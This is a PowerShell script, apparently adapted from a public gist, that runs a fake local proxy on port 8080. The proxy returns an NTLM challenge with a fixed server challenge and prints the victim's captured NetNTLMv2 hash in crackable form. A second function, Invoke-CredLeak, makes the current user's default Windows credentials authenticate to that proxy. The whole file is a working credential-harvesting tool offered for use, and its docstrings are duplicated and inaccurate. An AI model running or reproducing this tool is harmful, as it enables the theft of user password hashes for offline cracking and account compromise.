# Original code by @leftp
# https://gist.github.com/leftp/a3330f13ac55f584239baa68a3bb88f2

function Invoke-ProxyServer {

    <#

    .SYNOPSIS

    This function starts the proxy server on 8080
    
    .DESCRIPTION

    This function starts the proxy server on 8080

    
    #>

    Param(
        
       
    )

    $code = "f132ae278ad7f7a0"
	$e = "<html><head>Access Denied</head><body></body></html>"
	$e2 = "<html><head></head><body></body></html>"

	$nbdomainname = strtonullspacedhex("NODOMAIN")
	$dnsdomainname = strtonullspacedhex("NODOMAIN.COM")
	$computername = strtonullspacedhex("NO")
	$dnscomputername = strtonullspacedhex("NO.NODOMAIN.COM")

	$nbdomainnamelen = strlentohexint $nbdomainname 4
	$computernamelen = strlentohexint $computername 4
	$dnsdomainnamelen = strlentohexint $dnsdomainname 4
	$dnscomputernamelen = strlentohexint $dnscomputername 4

	$targetinfo = "0200"+$nbdomainnamelen+$nbdomainname+"0100"+$computernamelen+$computername+"0400"+$dnsdomainnamelen+$dnsdomainname+"0300"+$dnscomputernamelen+$dnscomputername+"0500"+$dnsdomainnamelen+$dnsdomainname+"0000"+"0000"

	$t1=hextoint "38000000"
	$t2=strlentohexint $nbdomainname 4
	$t2=hextoint $t2
	$t=($t1+$t2)
	$targetinfooffset = strtohexint $t 8

	$targetinfolen = strlentohexint $targetinfo 4
	$hexcode = "4e544c4d53535000"+"02000000"+$nbdomainnamelen+$nbdomainnamelen+"38000000"+"958289e2"+$code+"0000000000000000"+$targetinfolen+$targetinfolen+$targetinfooffset+"0000000000000000"+$nbdomainname+$targetinfo

	$Encoding = new-object system.text.asciiencoding;
	$Buffer=new-object system.byte[] 1024;
	$endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::loopback, 8080)
	$listener = new-object System.Net.Sockets.TcpListener $endpoint
	$listener.start()
	while ($true)
	{
		$client = $listener.AcceptTcpClient()
		$Stream = $client.GetStream()
		$reader = New-Object System.IO.StreamReader $Stream
		$writer = New-Object System.IO.StreamWriter $Stream
		#While($client.connected)
		#{
			$Result=""
			While($Stream.DataAvailable)
			{
				$Read=$Stream.Read($Buffer,0,1024);
				$Result+=$Encoding.GetString($Buffer, 0, $Read)
				#$Result+=$Buffer[0..$Read]
			}
			if ($Result -ne "")
			{
				$Result
				if ($Result -like "CONNECT*" -or $Result -like "GET*")
				{
					if ($Result -like "*Proxy-Authorization:*")
					{
						$b=($Result.split("`r`n") | Select-String -Pattern ("Proxy-Authorization")).tostring()
						$b=$b.split(" ")[$b.split(" ").length-1].split("`r`n")[0]
						$b=[System.Convert]::FromBase64String($b) -join " "
						$b=ByteArray-to-string $b
						if ($b.substring(8*2,4*2) -eq "01000000")
						{
							$t=string-to-bytearray $hexcode
							$t=[System.Convert]::ToBase64String($t)
							$res="HTTP/1.1 407 Proxy Authorization Required`r`nProxy-Authenticate: Negotiate " + $t + "`r`nContent-Type: text/html`r`nContent-Length: " + $e.length.tostring() + "`r`n`r`n" + $e
							$writer.write($res)
							$writer.flush()
						}
						if ($b.substring(8*2,4*2) -eq "03000000")
						{
							$offset_NTLMresponse = hextoint $b.substring(24*2,4*2)
							$length_NTLMresponse = hextoint $b.substring(20*2,2*2)
							$NTProofStr = $b.substring($offset_NTLMresponse*2,16*2)
							$NTLMresponse = $b.substring(($offset_NTLMresponse*2)+$NTProofStr.length,$length_NTLMresponse*2-$NTProofStr.length)
							$offset_domain = hextoint $b.substring(32*2,4*2)
							$length_domain = hextoint $b.substring(28*2,2*2)
							$offset_user = hextoint $b.substring(40*2,4*2)
							$length_user = hextoint $b.substring(36*2,2*2)
							$domain = $b.substring($offset_domain*2,$length_domain*2)
							$user = $b.substring($offset_user*2,$length_user*2)
							$user=hextostr $user
							$domain= hextostr $domain
							write-host ""
							write-host ""
							write-host $user"::"$domain":"$code":"$NTProofStr":"$NTLMresponse
							write-host ""
							write-host ""
							$res="HTTP/1.1 200 OK`r`nContent-Type: text/html`r`nContent-Length: " + $e2.length.tostring() + "`r`n`r`n" + $e2
							$writer.write($res)
							$writer.flush()
						}
					}
					else
					{
						$res="HTTP/1.1 407 Proxy Authorization Required`r`nProxy-Authenticate: Negotiate`r`nProxy-Authenticate: NTLM`r`nContent-Type: text/html`r`nContent-Length: " + $e.length.tostring() + "`r`n`r`n" + $e
						$writer.write($res)
						$writer.flush()
					}
				}
			}
		#}
		$client.Dispose()
		$writer.Dispose()
		$reader.Dispose()
		$stream.Dispose()
	}
	$listener.stop()
    
}

function Invoke-CredLeak {

    <#

    .SYNOPSIS

    This function starts the proxy server on 8080
    
    .DESCRIPTION

    This function starts the proxy server on 8080

    
    #>

    Param(
        
       
    )

    $wc = New-Object System.Net.WebClient
	$WebProxy = New-Object System.Net.WebProxy("http://127.0.0.1:8080",$true)
	$WebProxy.UseDefaultCredentials = $true
	$wc.Proxy = $WebProxy
	$wc.DownloadString("http://www.google.com")
    
}



function String-to-ByteArray ($String)
{
	$ByteArray=@()
	For ( $i = 0; $i -lt ($String.Length/2); $i++ ) 
	{
		$Chars=$String.Substring($i*2,2)
		$Byte=[Byte] "0x$Chars"
		$ByteArray+=$Byte
	}
	Return $ByteArray
}

function ByteArray-to-String ($ByteArray)
{
	ForEach ( $Byte In $ByteArray.ToString().Split(" ") ) 
	{
		$String="$String"+[Convert]::ToString($Byte,16).ToUpper().PadLeft(2,"0")
	}
	Return $String
}

function strtohex ($str)
{
	$b=$str.ToCharArray();
	Foreach ($element in $b) 
	{
		$c=$c+[System.String]::Format("{0:X}",[System.Convert]::ToUInt32($element))
	}
	return $c
}

function hextostr ($str)
{
	$temp=""
	for ($i = 0; $i -lt $str.length; $i += 2) 
	{
		$temp1=[convert]::Toint32($str.substring($i,2),16)
		if ($temp1 -ne 0)
		{
    		$temp=$temp+[char]$temp1
		}
	}	
	return $temp
}

function strtonullspacedhex ($str)
{
	$b=$str.ToCharArray();
	Foreach ($element in $b) 
	{
		$c=$c+[System.String]::Format("{0:X}",[System.Convert]::ToUInt32($element))+"00"
	}
	return $c
}

function strtohexint ($str,$length)
{
	$tmp="{0:X0}" -f $str
	if ($tmp.length -eq 1)
	{
		$tmp="0"+$tmp
	}
	if ($length-$tmp.length -gt 0)
	{
		$tmp=$tmp+"0"*($length-$tmp.length)
	}
	return $tmp
}

function strlentohexint ($str,$length)
{
	$tmp="{0:X0}" -f ($str.length/2)
	if ($tmp.length -eq 1)
	{
		$tmp="0"+$tmp
	}
	$tmp=$tmp+"0"*($length-$tmp.length)
	return $tmp
}

Function hextoint ($h) {
	$string=""
	For ( $i = 0; $i -lt ($h.Length/2); $i++ ) {
		$string=$string+$h.substring(($h.length)-($i*2)-2,2)
	}
	Return [convert]::Toint32($string,16)
}

